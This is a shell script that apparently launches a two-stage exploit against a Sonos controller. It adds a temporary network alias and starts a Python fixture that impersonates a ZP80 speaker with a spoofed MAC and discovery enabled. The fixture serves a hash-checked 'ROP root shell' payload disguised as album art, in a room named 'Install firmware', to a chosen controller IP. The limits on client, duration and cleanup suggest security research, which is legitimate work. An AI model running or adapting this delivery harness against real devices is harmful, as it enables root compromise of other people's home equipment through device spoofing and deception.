#!/bin/sh
# Bounded two-stage artwork delivery on the Pi's sonos0 interface.
set -eu
umask 077

if [ "$#" -ne 6 ]; then
    echo 'usage: run_rop_shell.sh STAGED_DIR PEER_DIR HOUSEHOLD CONTROLLER_IP FIXTURE_IP FIXTURE_MAC' >&2
    exit 2
fi
stage_dir=$1
peer_dir=$2
household=$3
controller_ip=$4
fixture_ip=$5
fixture_mac=$6
alias_cidr=$fixture_ip/24

if ! printf '%s\n' "$fixture_mac" | grep -Eq '^02(:[[:xdigit:]]{2}){5}$'; then
    echo 'fixture MAC must be a locally administered unicast address' >&2
    exit 2
fi

if ip -o -4 addr show dev sonos0 | grep -Fq "inet $alias_cidr "; then
    echo 'temporary address already exists; refusing to claim it' >&2
    exit 3
fi
if [ ! -f "$stage_dir/warmup_rop_art_fixture.py" ] || [ ! -f "$stage_dir/fixed-rop-system-root-shell.png" ] || [ ! -f "$peer_dir/zp80_peer.py" ]; then
    echo 'fixture, payload, or peer library missing' >&2
    exit 4
fi
if [ "$(sha256sum "$stage_dir/fixed-rop-system-root-shell.png" | cut -d ' ' -f 1)" != 5173a58755f4f092e3c34addcb9c2b6d9b4b746e209802511e3469177583c053 ]; then
    echo 'payload hash mismatch' >&2
    exit 5
fi

added=0
child=
ip_cmd() {
    if [ "$(id -u)" -eq 0 ]; then ip "$@"; else sudo -n ip "$@"; fi
}
cleanup() {
    if [ "$added" -eq 1 ]; then
        ip_cmd addr del "$alias_cidr" dev sonos0 || true
        added=0
    fi
}
stop() {
    if [ -n "$child" ]; then
        kill -TERM "$child" 2>/dev/null || true
        wait "$child" 2>/dev/null || true
    fi
    exit 0
}
trap cleanup EXIT
trap stop INT TERM

echo "$$" > "$stage_dir/runner.pid"
ip_cmd addr add "$alias_cidr" dev sonos0
added=1
CR100_ZP80_PEER_DIR=$peer_dir /usr/bin/python3 -u "$stage_dir/warmup_rop_art_fixture.py" \
    --payload "$stage_dir/fixed-rop-system-root-shell.png" \
    --bind "$fixture_ip" --advertise-ip "$fixture_ip" --port 1400 \
    --allowed-client "$controller_ip" --household "$household" \
    --mac "$fixture_mac" --room 'Install firmware' \
    --duration 300 --enable-discovery --unicast-target "$controller_ip" \
    > "$stage_dir/fixture.log" 2>&1 &
child=$!
echo "$child" > "$stage_dir/fixture.pid"
wait "$child"
